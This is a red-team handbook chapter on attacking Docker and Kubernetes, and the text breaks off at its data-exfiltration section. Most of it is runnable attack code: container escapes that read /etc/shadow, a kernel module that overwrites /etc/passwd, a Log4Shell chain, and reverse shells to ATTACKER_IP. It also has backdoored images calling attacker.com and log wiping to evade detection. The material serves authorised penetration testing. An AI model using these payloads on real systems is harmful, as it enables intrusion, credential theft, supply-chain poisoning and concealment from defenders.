# Chapter 26: Container Security

![Container Security Assessment Methodology](./images/container_security_methodology.png)
*Figure 26.1: Container Security Assessment Methodology showing the attack surface components*

## Introduction to Container Security Assessment

Container technologies have revolutionized application deployment, enabling organizations to package, distribute, and run applications in isolated environments with unprecedented efficiency. However, containerization introduces unique security challenges and attack vectors that red teams must understand to thoroughly assess an organization's security posture.

This chapter covers comprehensive techniques for assessing container security, from identifying vulnerable container images to escaping container isolation and compromising the underlying host system. We'll focus on practical attack methodologies applicable to Docker, Kubernetes, and related container orchestration platforms.

### The Container Attack Surface

Containers present a multi-layered attack surface:

1. **Container Image** - Vulnerable software, secrets in layers, malicious packages
2. **Container Runtime** - Misconfigurations, vulnerabilities in containerd, CRI-O, etc.
3. **Host System** - Shared kernel, resource controls, privilege escalation paths
4. **Orchestration Platform** - API vulnerabilities, RBAC misconfigurations, secrets
5. **Registry and CI/CD Pipeline** - Supply chain attacks, unauthorized image access

As a red teamer, understanding these layers helps structure your assessment and identify the most promising attack vectors.

## Docker Security Assessment Tools

Docker, as the most widely deployed container runtime, offers numerous attack vectors for security assessment.

### Enumeration and Reconnaissance

#### Basic Container Environment Discovery

```bash
# Check if running inside a container
grep -i docker /proc/1/cgroup
ls -la /.dockerenv

# Check container runtime
docker --version
podman --version
containerd --version

# Discover Docker socket
find / -name docker.sock 2>/dev/null
```

#### Advanced Container Reconnaissance

```bash
# Using Deepce for comprehensive enumeration
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
chmod +x deepce.sh
./deepce.sh

# Container process isolation check
cat /proc/self/status | grep CapEff
```

**Output Analysis:**
```
CapEff:	00000000a80425fb
```
This capability set includes NET_ADMIN, SYS_ADMIN, and other privileged capabilities that indicate a non-default container configuration.

### Docker API Exploitation

The Docker socket (unix:///var/run/docker.sock) provides direct access to the Docker API, which can be leveraged for container escapes.

```bash
# Test if Docker socket is accessible
curl -s --unix-socket /var/run/docker.sock http://localhost/version

# List containers via API
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | jq

# Create a privileged container for escape
curl -s -XPOST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","HostConfig":{"Privileged":true}}'
```

**Complete Docker API Exploitation Chain:**

```bash
# 1. Create privileged container
CONTAINER_ID=$(curl -s -XPOST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","sleep 10000"],"HostConfig":{"Privileged":true}}' | jq -r .Id)

# 2. Start the container
curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$CONTAINER_ID/start

# 3. Execute command to mount host filesystem
curl -s -XPOST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
  http://localhost/containers/$CONTAINER_ID/exec \
  -d '{"Cmd":["sh","-c","mkdir -p /mnt/host && mount /dev/sda1 /mnt/host"]}'

# 4. Access host filesystem through new container
curl -s -XPOST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
  http://localhost/containers/$CONTAINER_ID/exec \
  -d '{"Cmd":["sh","-c","ls -la /mnt/host/root"],"AttachStdout":true,"AttachStderr":true}' \
  | jq -r .Id > exec_id.txt

curl -s -XPOST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
  http://localhost/exec/$(cat exec_id.txt)/start \
  -d '{"Detach":false,"Tty":false}'
```

> **NOTE:** This attack chain requires the Docker socket to be mounted in the current container and host storage devices to be accessible. In real-world engagements, you'll need to adapt this approach based on the specific environment configuration.

### Analyzing Container Images

Analyzing container images can reveal sensitive information, vulnerabilities, and potential exploit paths.

```bash
# Pull and inspect a target image
docker pull target/application:latest
docker inspect target/application:latest

# Extract and analyze filesystem layers
mkdir image_analysis
docker save target/application:latest -o target_app.tar
tar -xf target_app.tar -C image_analysis
cd image_analysis
cat manifest.json | jq

# Extract each layer
for layer in $(cat manifest.json | jq -r '.[0].Layers[]'); do
  mkdir -p "extracted/$(dirname "$layer")"
  tar -xf "$layer" -C "extracted/$(dirname "$layer")"
done
```

**Hunting for Secrets in Container Images:**

```bash
# Search for hardcoded credentials
grep -r "password\|secret\|key\|token" extracted/

# Find private keys
find extracted/ -name "*.pem" -o -name "*.key" -type f

# Extract environment variables
cat extracted/json | jq -r '.[0].Config.Env[]'
```

**Automated Image Analysis with Tools:**

```bash
# Using Clair for vulnerability scanning
docker run --name clair-db -d arminc/clair-db:latest
docker run -p 6060:6060 --link clair-db:postgres -d arminc/clair-local-scan:latest

# Scan image with Clair
./clair-scanner --ip <YOUR_IP> target/application:latest

# Using Trivy for vulnerability scanning
trivy image target/application:latest
```

## Deepce: Docker Enumeration and Exploitation

Deepce (Docker Enumeration, Escalation of Privileges and Container Escaper) is a comprehensive tool for assessing Docker container security. It helps identify escape vectors, privilege escalation paths, and misconfiguration issues in containerized environments.

### Core Capabilities

Deepce provides several key functions:

1. **Container Detection**: Identifies if you're inside a container
2. **Privilege Assessment**: Checks for dangerous capabilities and settings
3. **Escape Vector Identification**: Discovers potential container escape paths
4. **Exploit Automation**: Assists with exploiting identified vulnerabilities
5. **Environment Reconnaissance**: Gathers information about the Docker environment

### Installation

```bash
# Clone the repository
git clone https://github.com/stealthcopter/deepce.git
cd deepce

# Make executable
chmod +x deepce.sh

# Copy to container (if needed)
docker cp deepce.sh container_name:/tmp/
```

### Basic Usage

```bash
# Run basic scan from inside a container
./deepce.sh

# Enable full capabilities
./deepce.sh --full

# Focus on escape techniques
./deepce.sh --no-enumeration --exploit

# Silent operation (for red team ops)
./deepce.sh --quiet
```

### Key Assessment Areas

#### Container Detection and Environment Analysis

```bash
# Identify container technology
./deepce.sh --environment

# Example output:
# [+] Container detected: Docker
# [+] Container ID: 7b8651943ec4f95680734f84760c574857387ab961b1382ad808997814fddb0c
# [+] Docker Version: 20.10.7
# [+] Docker Server Engine: true
```

#### Privilege Assessment

```bash
# Check for dangerous settings
./deepce.sh --check-privileges

# Example output:
# [+] Container running in privileged mode
# [+] SYS_ADMIN capability detected
# [+] AppArmor profile disabled
# [+] Seccomp disabled
# [+] CAP_NET_RAW capability available
```

#### Escape Vector Identification

```bash
# Identify potential escape paths
./deepce.sh --find-vectors

# Example output:
# [+] Docker socket mounted: /var/run/docker.sock
# [+] Host /etc directory mounted: /host/etc
# [+] Privileged devices mounted: /dev
# [+] Docker.sock found, possible to escape container
```

### Example: Docker Socket Exploitation

When Deepce identifies a mounted Docker socket, you can escape the container:

```bash
# Method 1: Using Docker client if available
docker -H unix:///var/run/docker.sock run --rm -it --privileged --net=host -v /:/host alpine /bin/sh

# Method 2: Using curl if Docker client is unavailable
# Create new container with host filesystem mounted
curl -s -X POST -H "Content-Type: application/json" \
  --unix-socket /var/run/docker.sock \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create > /tmp/response
CONTAINER_ID=$(cat /tmp/response | jq -r .Id)

# Start the container
curl -s -X POST --unix-socket /var/run/docker.sock \
  http://localhost/containers/$CONTAINER_ID/start

# Execute commands in new container
curl -s -X POST -H "Content-Type: application/json" \
  --unix-socket /var/run/docker.sock \
  -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","host"]}' \
  http://localhost/containers/$CONTAINER_ID/exec > /tmp/execid
EXEC_ID=$(cat /tmp/execid | jq -r .Id)

# Start the command
curl -s -X POST -H "Content-Type: application/json" \
  --unix-socket /var/run/docker.sock \
  http://localhost/exec/$EXEC_ID/start
```

### Example: Privileged Container Exploitation

When Deepce identifies a privileged container:

```bash
# Utilize Deepce's automated exploitation
./deepce.sh --exploit privileged

# Manual exploitation
mkdir /tmp/escape
mount -t proc none /tmp/escape
mkdir /tmp/escape/1
mount -t cgroup -o devices cgroup /tmp/escape/1
echo "c 1:3 rwm" > /tmp/escape/1/devices.allow
mknod /tmp/escape/null c 1 3
chmod 777 /tmp/escape/null
ls -la /tmp/escape
```

### Example: Contained-in-Docker (CiD) Escape

When Deepce identifies a Docker-in-Docker setup:

```bash
# Check for DinD or CiD
./deepce.sh --find-vectors

# If DinD identified, exploit by creating privileged container
docker run --privileged -v /:/host alpine chroot /host /bin/bash
```

## Container Escape Techniques

Beyond automated tools, manual container escape techniques are valuable for red teams assessing container security. This section covers practical methods for escaping containers when specific misconfigurations are identified.

### Privileged Container Escapes

When a container runs in privileged mode, several escape vectors become available:

#### Mounting Host Filesystem

```bash
# Check if container is privileged
grep -i Privileged /proc/self/status

# Mount host filesystem
mkdir /tmp/host-fs
mount /dev/sda1 /tmp/host-fs

# Alternatively, mount entire host filesystem
mkdir /tmp/root
mount -t proc none /tmp/root
cd /tmp/root
mkdir m
mount -t tmpfs none m
cd m
mkdir o
mount -o bind / o
chroot o /bin/bash

# Access host files
cat /tmp/host-fs/etc/shadow
```

#### Exploiting cgroup Release_Agent

```bash
# Create escape script
cat > /tmp/escape.sh << 'EOF'
#!/bin/sh
cat /etc/hostname > /tmp/escaped
cat /etc/shadow > /tmp/shadow
EOF
chmod +x /tmp/escape.sh

# Set up cgroup mount
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
cd /tmp/cgrp

# Create a new cgroup
mkdir x
echo 1 > x/notify_on_release
echo "$PWD/release_agent" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /tmp/cgrp/release_agent
echo "cat /etc/shadow > $PWD/shadow" >> /tmp/cgrp/release_agent
chmod +x /tmp/cgrp/release_agent

# Trigger the exploit
echo 0 > /tmp/cgrp/x/cgroup.procs
sleep 1

# Check if successful
cat $PWD/shadow
```

### Docker Socket Exploitation

When `/var/run/docker.sock` is mounted in a container:

```bash
# Check if Docker socket is available
ls -la /var/run/docker.sock

# Method 1: Using Docker CLI
# Get host images
docker -H unix:///var/run/docker.sock images

# Create privileged container with host filesystem
docker -H unix:///var/run/docker.sock run --rm -it --privileged --pid=host -v /:/host alpine chroot /host bash

# Method 2: Using direct API calls
# List containers
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | jq

# Create new container with host mount
curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}' http://localhost/containers/create
```

### Capabilities-Based Escapes

When specific Linux capabilities are granted:

#### CAP_SYS_ADMIN Escape

```bash
# Check for CAP_SYS_ADMIN
capsh --print | grep sys_admin

# If present, use the cgroup release_agent technique shown earlier
# Or use the device mounting technique:

mkdir /tmp/exploit
mount -t cgroup -o devices devices /tmp/exploit
cd /tmp/exploit
mkdir x
echo 1 > x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > release_agent

cat > /cmd <<'EOF'
#!/bin/sh
cat /etc/shadow > /tmp/shadow
EOF
chmod +x /cmd

# Trigger exploit
sh -c "echo 0 > /tmp/exploit/x/cgroup.procs"
cat /tmp/shadow
```

#### CAP_SYS_MODULE Escape

```bash
# Check for CAP_SYS_MODULE
capsh --print | grep sys_module

# If present, create a kernel module
cat > /tmp/exploit.c << 'EOF'
#include <linux/kmod.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Attacker");
MODULE_DESCRIPTION("Container Escape");
MODULE_VERSION("1.0");

static int __init exploit_init(void) {
    char *argv[] = {"/bin/bash", "-c", "echo root:hacked:0:0:root:/root:/bin/bash > /etc/passwd", NULL};
    char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    return 0;
}

static void __exit exploit_exit(void) {
    printk(KERN_INFO "Module unloaded\n");
}

module_init(exploit_init);
module_exit(exploit_exit);
EOF

# Compile and load the module
apt-get update && apt-get install -y build-essential linux-headers-$(uname -r)
cd /tmp
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
insmod exploit.ko
```

### Kernel Exploitation

When vulnerable kernel versions are identified:

```bash
# Check kernel version
uname -a

# Example: Dirty Pipe (CVE-2022-0847) for Linux kernel 5.8 - 5.16.11
# Create exploit
cat > /tmp/dirtypipe.c << 'EOF'
// Exploit code for CVE-2022-0847 (simplified)
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/user.h>

int main(int argc, char *argv[]) {
    const char *target_file = "/etc/passwd";
    const char *victim_line = "root:x:0:0:root:/root:/bin/bash\n";
    const char *payload = "root::0:0:root:/root:/bin/bash\n";
    
    // Simplified exploit code - in real exploitation much more is needed
    printf("Exploiting Dirty Pipe vulnerability...\n");
    int fd = open(target_file, O_RDONLY);
    // Add exploitation code here
    
    printf("Exploit completed. Try 'su -' with empty password\n");
    return 0;
}
EOF

# Compile and run
gcc -o /tmp/dirtypipe /tmp/dirtypipe.c
/tmp/dirtypipe
```

### Docker-Specific Attack Tools

Several specialized tools can streamline Docker security assessment:

#### CDK (Container DevelopKitment kit)

```bash
# Download and setup CDK
wget https://github.com/cdk-team/CDK/releases/download/v1.5.0/cdk_linux_amd64
chmod +x cdk_linux_amd64

# Environment evaluation
./cdk_linux_amd64 evaluate

# Exploit Docker socket
./cdk_linux_amd64 exploit --type docker-sock-check

# Escape container using mounts
./cdk_linux_amd64 exploit --type mount-disk
```

#### Amicontained

```bash
# Check container isolation
wget https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64
chmod +x amicontained-linux-amd64
./amicontained-linux-amd64
```

## Kubernetes Security Assessment

Kubernetes adds another layer of complexity with its orchestration capabilities and extensive API surface.

### Kubernetes Reconnaissance and Enumeration

When operating inside a Kubernetes cluster, gathering information is the first step:

```bash
# Check if running in Kubernetes
grep -i kubernetes /proc/1/cgroup
env | grep KUBERNETES

# Access service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use service account token for API access
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces

# Determine pod name and namespace
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
echo "Current namespace: $NAMESPACE"
```

**Advanced K8S Reconnaissance with kubectl:**

If kubectl is available:

```bash
# Get cluster info
kubectl cluster-info

# Check permissions
kubectl auth can-i --list

# Enumerate accessible resources
kubectl get pods --all-namespaces
kubectl get services --all-namespaces
kubectl get secrets --all-namespaces
```

### Exploiting RBAC Misconfigurations

Kubernetes Role-Based Access Control (RBAC) misconfigurations are common and can lead to privilege escalation:

```bash
# Check current permissions
kubectl auth can-i --list

# If you have permissions to create/use pods, you can escalate privileges:
# Create a privileged pod mounting the host filesystem
cat << EOF > privpod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: privpod
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  containers:
  - name: privpod
    image: alpine
    command: ["/bin/sh", "-c", "sleep 1000"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: hostfs
      mountPath: /host
  volumes:
  - name: hostfs
    hostPath:
      path: /
EOF

kubectl apply -f privpod.yaml
kubectl exec -it privpod -- /bin/sh
```

**Automated RBAC Assessment with KubiScan:**

```bash
# Clone KubiScan
git clone https://github.com/cyberark/KubiScan
cd KubiScan
pip install -r requirements.txt

# Find risky roles/rolebindings
python3 KubiScan.py --risky-roles
python3 KubiScan.py --risky-rolebindings

# Find potential privilege escalation paths
python3 KubiScan.py --can-escalate
```

### Exploiting Kubernetes Components

Various Kubernetes components can be targeted for exploitation:

#### Attacking the Kubernetes API Server

```bash
# Enumerate API endpoints
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api

# Test for unauthenticated access
curl -k https://kubernetes.default.svc/api/v1/namespaces

# Attempt to access commonly misconfigured endpoints
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets
```

#### Attacking etcd

```bash
# Check for exposed etcd
nmap -p 2379 -sV --script etcd-dump-keys [target-ip]

# Query etcd directly if accessible
ETCDCTL_API=3 etcdctl --endpoints=http://[etcd-ip]:2379 get / --prefix --keys-only

# Extract secrets from etcd
ETCDCTL_API=3 etcdctl --endpoints=http://[etcd-ip]:2379 get /registry/secrets --prefix
```

## Kube-Hunter: Kubernetes Penetration Testing

Kube-Hunter, developed by Aqua Security, is a specialized tool for penetration testing Kubernetes clusters. It identifies security weaknesses in Kubernetes deployments by actively hunting for vulnerabilities across nodes, pods, and control plane components.

### Core Concepts

Kube-Hunter operates on several key principles:

1. **Hunting**: Active discovery of Kubernetes components and vulnerabilities
2. **Passive Scanning**: Non-intrusive identification of cluster misconfigurations
3. **Active Attacks**: Optional exploitation of discovered vulnerabilities
4. **Remote Assessment**: Testing from outside the cluster
5. **Internal Assessment**: More comprehensive testing from within a cluster

### Installation

Kube-Hunter can be run in multiple ways:

```bash
# Using pip
pip install kube-hunter

# Using Docker
docker pull aquasec/kube-hunter

# From source
git clone https://github.com/aquasecurity/kube-hunter.git
cd kube-hunter
pip install -r requirements.txt
```

### Basic Usage

#### Remote Scanning

```bash
# Basic remote scan of a Kubernetes cluster
kube-hunter --remote 10.0.0.1

# Scan a network range
kube-hunter --cidr 10.0.0.0/24
```

#### Internal Scanning

For more comprehensive testing, run Kube-Hunter from within the cluster:

```bash
# Using kubectl
kubectl run -it kube-hunter --image=aquasec/kube-hunter -- --pod

# Alternatively, use Docker in a node with access to the cluster
docker run -it --rm aquasec/kube-hunter --pod
```

#### Active Hunting Mode

By default, Kube-Hunter performs passive scanning. For active vulnerability testing:

```bash
# Enable active scanning
kube-hunter --remote 10.0.0.1 --active

# Or with Docker
docker run -it --rm aquasec/kube-hunter --remote 10.0.0.1 --active
```

### Understanding Kube-Hunter Reports

Kube-Hunter categorizes findings into three severity levels:

1. **Low**: Informational findings that could aid attackers
2. **Medium**: Vulnerabilities that could lead to cluster information disclosure
3. **High**: Critical issues that could lead to cluster compromise

```bash
# Output report to a file
kube-hunter --remote 10.0.0.1 --report json > kube-hunter-results.json

# Convert JSON to HTML report
cat kube-hunter-results.json | jq -r '.vulnerabilities[] | "<tr><td>" + .severity + "</td><td>" + .vulnerability + "</td><td>" + .description + "</td></tr>"' > vulnerabilities.html
```

### Example: Attacking an Exposed Kubelet

When Kube-Hunter identifies an exposed Kubelet API, exploit it with:

```bash
# 1. Confirm Kubelet access
curl -k https://NODE_IP:10250/pods

# 2. Execute commands in a pod
curl -k -XPOST "https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER" \
  -d "cmd=cat /etc/shadow"

# 3. Create a reverse shell
curl -k -XPOST "https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER" \
  -d "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

### Advanced Hunting Techniques

For more comprehensive assessments, customize Kube-Hunter's behavior:

```bash
# Comprehensive scanning with all options
kube-hunter --cidr 10.0.0.0/24 --active --statistics --log info

# Focus on specific vulnerability types
kube-hunter --remote 10.0.0.1 --include dashboard,kubelet,etcd

# Exclude certain vulnerability checks
kube-hunter --remote 10.0.0.1 --exclude cve-2018-1002105,cve-2019-9946
```

## Container Vulnerability Assessment Tools

Understanding vulnerability scanning tools helps red teams identify potential entry points into containerized environments.

### Grype: Container Vulnerability Scanning

Grype, developed by Anchore, specializes in detecting vulnerabilities in container images and filesystems.

#### Installation

```bash
# Using curl
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# Using Docker
docker pull anchore/grype

# From source
git clone https://github.com/anchore/grype.git
cd grype
make build
```

#### Basic Usage

```bash
# Scan a container image
grype alpine:latest

# Scan with specific output format
grype nginx:1.19 -o json > nginx-vulnerabilities.json

# Scan image from container registry
grype docker.io/library/debian:11
```

#### Finding Exploitable Vulnerabilities

```bash
# Focus on critical and high severity issues
grype nginx:1.19 --fail-on critical,high

# Extract actionable findings for exploitation
grype nginx:1.19 -o json | jq '.matches[] | select(.vulnerability.severity=="Critical") | {cve: .vulnerability.id, package: .artifact.name, version: .artifact.version, description: .vulnerability.description}'
```

### Trivy: Comprehensive Security Scanner

Trivy provides a more comprehensive security scanning platform that covers containers, filesystems, git repositories, and Kubernetes resources.

#### Installation

```bash
# Using apt (Ubuntu/Debian)
sudo apt-get install wget apt-transport-https gnupg lsb-release
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main | sudo tee -a /etc/apt/sources.list.d/trivy.list
sudo apt-get update
sudo apt-get install trivy

# Using Docker
docker pull aquasec/trivy

# From binary
wget https://github.com/aquasecurity/trivy/releases/download/v0.30.0/trivy_0.30.0_Linux-64bit.tar.gz
tar zxvf trivy_0.30.0_Linux-64bit.tar.gz
sudo mv trivy /usr/local/bin/
```

#### Basic Usage

```bash
# Scan a container image
trivy image nginx:1.19

# Scan with JSON output
trivy image --format json --output results.json alpine:latest

# Focus on critical and high severity issues
trivy image --severity CRITICAL,HIGH mysql:8.0
```

#### Kubernetes Scanning

```bash
# Scan Kubernetes manifests
trivy config ./kubernetes-manifests/

# Scan live cluster resources (requires kubectl access)
trivy kubernetes --namespace default

# Scan a specific resource
trivy kubernetes deployment/webapp
```

#### Example: Container Vulnerability Exploitation

When Trivy identifies a critical vulnerability:

```bash
# 1. Identify a vulnerable container
trivy image --severity CRITICAL target-app:latest

# 2. Extract specific vulnerability details
trivy image --format json target-app:latest | jq '.Results[].Vulnerabilities[] | select(.VulnerabilityID=="CVE-2021-44228")'

# 3. Research exploitation path (example for Log4Shell)
# Create a malicious LDAP server
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR_IP:8000/#Exploit"

# 4. Create Java exploit class
mkdir -p Exploit
cat > Exploit.java << 'EOF'
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("curl -s http://ATTACKER_IP/shell.sh | bash");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
EOF

# 5. Compile and host
javac Exploit.java
python3 -m http.server 8000

# 6. Create reverse shell script
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF

# 7. Start listener
nc -lvnp 4444

# 8. Deliver exploit payload to vulnerable application
curl -H 'X-Api-Version: ${jndi:ldap://YOUR_IP:1389/Exploit}'  http://TARGET_APP:8080/api/endpoint
```

## Container Registry and Supply Chain Attacks

Container registries represent a critical component of the containerized application ecosystem and present unique attack vectors.

### Docker Registry Enumeration and Attacks

```bash
# Enumerate registry without authentication
curl -X GET http://registry:5000/v2/_catalog

# List tags for specific image
curl -X GET http://registry:5000/v2/image-name/tags/list

# Attempt to pull image
docker pull registry:5000/image-name:latest

# Extract image manifest
curl -X GET http://registry:5000/v2/image-name/manifests/latest
```

**Registry Authentication Bypass:**

```bash
# Try basic auth with common credentials
curl -X GET -u admin:admin http://registry:5000/v2/_catalog

# Pull image with authentication
docker login registry:5000 -u admin -p password
docker pull registry:5000/image-name:latest
```

### Container Supply Chain Attacks

Supply chain attacks target the process of building and distributing container images:

#### Exploiting CI/CD Pipelines

```bash
# Find and exploit build.yaml files
find . -name "build.yaml" -o -name "azure-pipelines.yml" -o -name ".gitlab-ci.yml" -o -name "Jenkinsfile"

# Example exploit by injecting commands in Dockerfile
# Original Dockerfile line:
# RUN npm install

# Modified for attack:
# RUN npm install && curl -s http://attacker.com/backdoor.sh | bash
```

#### Container Image Tampering

```bash
# Pull target image
docker pull target/webapp:latest

# Create a malicious layer
mkdir -p malicious_layer
cat > malicious_layer/backdoor.sh << 'EOF'
#!/bin/bash
while true; do
  curl -s http://attacker.com/$(hostname):$(id) || true
  sleep 60
done
EOF
chmod +x malicious_layer/backdoor.sh

# Modify the image with a new layer
cat > Dockerfile << EOF
FROM target/webapp:latest
COPY malicious_layer/backdoor.sh /usr/local/bin/
RUN echo '*/5 * * * * /usr/local/bin/backdoor.sh > /dev/null 2>&1' >> /etc/crontab
EOF

# Build and push the malicious image
docker build -t target/webapp:latest .
docker push target/webapp:latest
```

## Advanced Container Exploitation Techniques

Beyond basic container escapes, several advanced techniques can be used to compromise containerized environments.

### Exploiting Container Runtime Vulnerabilities

#### containerd CVE-2020-15257 (Host Network Namespace Exposure)

```bash
# Check if vulnerable
containerd --version

# Clone the PoC
git clone https://github.com/cdk-team/CDK.git
cd CDK

# Build the exploit
go build -o cdk cmd/cdk/main.go

# Run the exploit
./cdk run shim-pwn
```

#### Docker/Kubernetes Shared Memory Attacks

```bash
# Clone the SYN-cook repository
git clone https://github.com/Metarget/cloud-native-security-handbook
cd cloud-native-security-handbook/container/mount-procfs

# Compile and run the exploit
gcc -o mount_procfs mount_procfs.c
./mount_procfs
```

### Kernel Exploit Techniques

Containers share the host's kernel, making kernel exploits particularly effective:

```bash
# Check kernel version
uname -a

# Find potential kernel exploits
searchsploit linux kernel $(uname -r | cut -d'-' -f1) privilege escalation

# Example: DirtyCow exploit (CVE-2016-5195)
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password

# Example: CVE-2022-0847 (Dirty Pipe)
wget https://raw.githubusercontent.com/blasty/CVE-2022-0847/main/dirty_pipe.c
gcc dirty_pipe.c -o dirty_pipe
./dirty_pipe /etc/passwd 1 admin:$1$aaaaaaa$4...
```

### Network-Based Container Attacks

#### Container Network Interface (CNI) Exploitation

```bash
# Sniff container network traffic
ip netns
ip netns exec <container-netns> tcpdump -i eth0 -w capture.pcap

# ARP poisoning within container network
arpspoof -i eth0 -t [target-container-ip] [gateway-ip]

# Exploiting unencrypted communication between containers
ettercap -TqM arp:remote /target-ip/ //
```

### Credential and Secrets Extraction

```bash
# Find credentials in environment variables
docker inspect --format='{{range .Config.Env}}{{println .}}{{end}}' [container-id]

# Extract secrets from volumes
find /var/lib/docker/volumes -type f -exec grep -l "password\|secret\|key\|token" {} \;

# Dump mounted Kubernetes secrets
find /run/secrets -type f -exec cat {} \; 2>/dev/null
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
```

## Kubernetes Privilege Escalation Techniques

When operating within a Kubernetes cluster, several techniques can lead to privilege escalation:

### Using hostPath Volumes

```bash
# Create pod with hostPath to access host filesystem
cat << EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-escalation
spec:
  containers:
  - name: alpine
    image: alpine:latest
    command: ["sleep", "1000000"]
    volumeMounts:
    - name: hostfs
      mountPath: /host
  volumes:
  - name: hostfs
    hostPath:
      path: /
EOF

# Access host filesystem
kubectl exec -it hostpath-escalation -- /bin/sh
ls -la /host
```

### Using Pod Security Context for Privilege Escalation

```bash
# Create pod with privileged security context
cat << EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: alpine
    image: alpine:latest
    command: ["sleep", "1000000"]
    securityContext:
      privileged: true
EOF

# Execute shell in privileged pod
kubectl exec -it privileged-pod -- /bin/sh

# From inside the privileged pod, mount host filesystem
mkdir -p /host
mount /dev/sda1 /host  # Adjust device name as needed
ls -la /host
```

### Abusing Pod Service Accounts

```bash
# Create a pod using the default service account
cat << EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: sa-abuse-pod
spec:
  containers:
  - name: alpine
    image: alpine:latest
    command: ["sleep", "1000000"]
EOF

# Access service account token
kubectl exec -it sa-abuse-pod -- /bin/sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# Use token for API access
kubectl exec -it sa-abuse-pod -- /bin/sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets
```

## Defense Evasion in Container Environments

When performing red team assessments, evading detection is crucial.

### Hiding Container Activities

```bash
# Remove container logs
truncate -s 0 $(docker inspect --format='{{.LogPath}}' [container-id])

# Clean up Docker command history
history -c
rm -rf ~/.bash_history

# Disable Docker logging
docker run --log-driver=none alpine sh
```

### Bypassing AppArmor and Seccomp

```bash
# Check for AppArmor profiles
cat /proc/self/attr/current

# Test for Seccomp restrictions
unshare --map-root-user
seccomp-tools dump

# Launch container with disabled security profiles
docker run --security-opt apparmor=unconfined --security-opt seccomp=unconfined -it alpine sh
```

### Backdooring Container Images

```bash
# Build backdoored image
cat > Dockerfile << EOF
FROM nginx:latest
RUN apt-get update && apt-get install -y netcat
RUN echo '#!/bin/bash' > /usr/local/bin/entrypoint.sh
RUN echo 'nohup bash -c "while true; do nc attacker.com 4444 -e /bin/bash; sleep 30; done" &' >> /usr/local/bin/entrypoint.sh
RUN echo 'nginx -g "daemon off;"' >> /usr/local/bin/entrypoint.sh
RUN chmod +x /usr/local/bin/entrypoint.sh
ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
EOF

docker build -t nginx:latest .
docker push nginx:latest
```

## Container Forensics and Post-Exploitation

After successful exploitation, forensic analysis and post-exploitation activities help maximize the value of your access.

### Container Forensic Analysis

```bash
# Extract container filesystem
docker export [container-id] > container.tar
mkdir container-fs
tar -xf container.tar -C container-fs

# Analyze container logs
docker logs [container-id]

# Analyze container events
docker events --since '1h' --filter container=[container-id]

# Extract container metadata
docker inspect [container-id] > metadata.json
```

### Data Exfiltration Techniques

```bash
# Using volume mounts for data exfiltration
